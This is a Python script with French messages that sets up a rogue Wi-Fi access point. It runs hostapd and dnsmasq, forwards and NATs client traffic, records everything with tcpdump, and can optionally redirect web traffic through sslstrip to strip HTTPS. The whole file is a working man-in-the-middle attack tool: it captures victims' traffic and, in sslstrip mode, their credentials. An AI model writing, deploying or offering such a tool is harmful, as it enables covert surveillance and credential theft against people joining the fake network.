import subprocess
import sys
import time
import argparse
import os
import tempfile
import shutil

##############################
########## Arguments #########
##############################

parser = argparse.ArgumentParser()
parser.add_argument("wlanInterface", help="L'interface en mode moniteur", type=str)
parser.add_argument("inetInterface", help="L'interface internet", type=str)
parser.add_argument("--ssid", help="SSID du réseau", type=str, required=True)
parser.add_argument("--wpa", help="Phrase de passe WPA du réseau", type=str, required=True)
parser.add_argument("--channel", help="Canal à utiliser", type=int, required=True)
parser.add_argument("--sslstrip", help="Utiliser sslstrip", action="store_true")
parser.add_argument("--logDir", help="Répertoire pour sauvegarder les données capturées", type=str, default=".")
args = parser.parse_args()

##############################
######## Vérifications #######
##############################

def die(message):
    sys.stderr.write("%s\n" % message)
    exit(1)

def check_sslstrip():
    try:
        return not subprocess.call(["sslstrip", "--help"], stdout=null, stderr=null)
    except:
        return False

def check_hostapd():
    try:
        return subprocess.call(["hostapd", "--help"], stdout=null, stderr=null) != 127
    except:
        return False

def check_dnsmasq():
    try:
        return not subprocess.call(["dnsmasq", "--help"], stdout=null, stderr=null)
    except:
        return False

def check_tcpdump():
    try:
        return subprocess.call(["tcpdump", "--help"], stdout=null, stderr=null) != 127
    except:
        return False

def check_iptables():
    try:
        return not subprocess.call(["iptables", "--help"], stdout=null, stderr=null)
    except:
        return False

def check_ip():
    try:
        return not subprocess.call(["ip", "link", "show"], stdout=null, stderr=null)
    except:
        return False

def check_mergecap():
    try:
        return subprocess.call(["mergecap", "--help"], stdout=null, stderr=null) != 127
    except:
        return False

def poll_iface_exists(iface):
    return not subprocess.call(["ip", "link", "show", iface], stdout=null, stderr=null)

null = open("/dev/null", "w")

if os.geteuid(): die("Vous devez être root")
if not check_ip(): die("Commande ip absente ou cassée")
if not check_tcpdump(): die("Commande tcpdump absente ou cassée")
if not check_mergecap(): die("Commande mergecap absente ou cassée")
if not check_iptables(): die("iptables absent ou cassé")
if not check_dnsmasq(): die("Commande dnsmasq absente ou cassée")
if not check_hostapd(): die("Commande hostapd absente ou cassée")
if args.sslstrip and not check_sslstrip(): die("Commande sslstrip absente ou cassée")

if not poll_iface_exists(args.wlanInterface): die("%s n'est pas une interface valide" % args.wlanInterface)
if not poll_iface_exists(args.inetInterface): die("%s n'est pas une interface valide" % args.inetInterface)
if (len(args.wpa) < 8) or (len(args.wpa) > 63): die("La phrase de passe WPA doit contenir entre 8 et 63 caractères")

##############################
####### Configuration ########
##############################

logTempDir = tempfile.mkdtemp()
logPcapDir = os.path.join(logTempDir, "pcap")
os.makedirs(logPcapDir, exist_ok=True)
os.makedirs(args.logDir, exist_ok=True)

print("Démarrage du Rogue AP\n")
print("En cours d'exécution")

subprocess.call(["iw", "dev", args.wlanInterface, "set", "channel", str(args.channel)], stdout=null, stderr=null)

iface = args.wlanInterface

with open("/proc/sys/net/ipv4/ip_forward", "r") as f: ipForward = f.read().strip()
with open("/proc/sys/net/ipv4/ip_forward", "w") as f: f.write("1")
subprocess.call(["iptables", "-I", "FORWARD", "-i", iface, "-o", args.inetInterface, "-j", "ACCEPT"], stdout=null, stderr=null)
subprocess.call(["iptables", "-I", "FORWARD", "-o", iface, "-i", args.inetInterface, "-j", "ACCEPT"], stdout=null, stderr=null)
subprocess.call(["iptables", "-t", "nat", "-I", "POSTROUTING", "-o", args.inetInterface, "-j", "MASQUERADE"], stdout=null, stderr=null)

if args.sslstrip:
    subprocess.call(["iptables", "-t", "nat", "-I", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"], stdout=null, stderr=null)

n, hostapdPath = tempfile.mkstemp()
with os.fdopen(n, "w") as f:
    f.write(f"interface={iface}\n")
    f.write("driver=nl80211\n")
    f.write(f"ssid={args.ssid}\n")
    f.write(f"channel={args.channel}\n")
    f.write("wpa=3\n")
    f.write(f"wpa_passphrase={args.wpa}\n")

n, dnsmasqPath = tempfile.mkstemp()
with os.fdopen(n, "w") as f:
    f.write(f"interface={iface}\n")
    f.write("dhcp-range=10.55.66.100,10.55.66.200,5m\n")
    f.write("dhcp-option=3,10.55.66.1\n")
    f.write("dhcp-option=6,10.55.66.1\n")
    f.write("no-hosts\n")
    f.write("addn-hosts=/dev/null\n")

def nuke_all(popenList):
    for popen in popenList:
        if popen.poll() is None:
            popen.kill()
    popenList.clear()


##############################
##### Boucle principale ######
##############################

try:
    pids = []
    deathloopCount = -1
    while True:
        deathloopCount += 1
        print(f"********** INIT #{deathloopCount} *************")

        p = subprocess.Popen(["hostapd", hostapdPath])
        pids.append(p)

        print(f"Attente de l'apparition de l'interface '{iface}'")
        while not poll_iface_exists(iface):
            time.sleep(0.01)

        subprocess.call(["ifconfig", iface, "10.55.66.1", "netmask", "255.255.255.0", "up"])

        pcapFile = os.path.join(logPcapDir, str(deathloopCount))
        p = subprocess.Popen(["tcpdump", "-i", iface, "-w", pcapFile], stdout=null, stderr=null)
        pids.append(p)

        if args.sslstrip:
            p = subprocess.Popen(["sslstrip", "-a", "-f"], stderr=null)
            pids.append(p)

        p = subprocess.Popen(["dnsmasq", "-d", "-C", dnsmasqPath])
        pids.append(p)

        while True:
            if any(pid.poll() is not None for pid in pids):
                break
            time.sleep(0.01)

        print("Un programme de la chaîne a échoué, redémarrage de la chaîne...\n")
        nuke_all(pids)

except KeyboardInterrupt:
    pass

##############################
########## Nettoyage #########
##############################

print("Arrêt du Rogue AP")
nuke_all(pids)

pcapFiles = [os.path.join(logPcapDir, f) for f in os.listdir(logPcapDir)
              if os.path.isfile(os.path.join(logPcapDir, f))]

if pcapFiles:
    outputPcap = os.path.join(args.logDir, "capture.pcap")
    subprocess.call(["mergecap", "-w", outputPcap] + pcapFiles, stdout=null, stderr=null)
    print(f"Captures fusionnées dans {outputPcap}")
else:
    print("Aucune capture réseau à fusionner")

shutil.rmtree(logTempDir, ignore_errors=True)

with open("/proc/sys/net/ipv4/ip_forward", "w") as f: f.write(ipForward)
subprocess.call(["iptables", "-D", "FORWARD", "-i", iface, "-o", args.inetInterface, "-j", "ACCEPT"], stdout=null, stderr=null)
subprocess.call(["iptables", "-D", "FORWARD", "-o", iface, "-i", args.inetInterface, "-j", "ACCEPT"], stdout=null, stderr=null)
subprocess.call(["iptables", "-t", "nat", "-D", "POSTROUTING", "-o", args.inetInterface, "-j", "MASQUERADE"], stdout=null, stderr=null)

if args.sslstrip:
    subprocess.call(["iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"], stdout=null, stderr=null)

subprocess.call(["ip", "addr", "flush", args.wlanInterface], stdout=null, stderr=null)
subprocess.call(["ip", "link", "set", args.wlanInterface, "down"], stdout=null, stderr=null)
subprocess.call(["iw", "dev", args.wlanInterface, "set", "type", "monitor"], stdout=null, stderr=null)
subprocess.call(["ip", "link", "set", args.wlanInterface, "up"], stdout=null, stderr=null)

os.remove(dnsmasqPath)
os.remove(hostapdPath)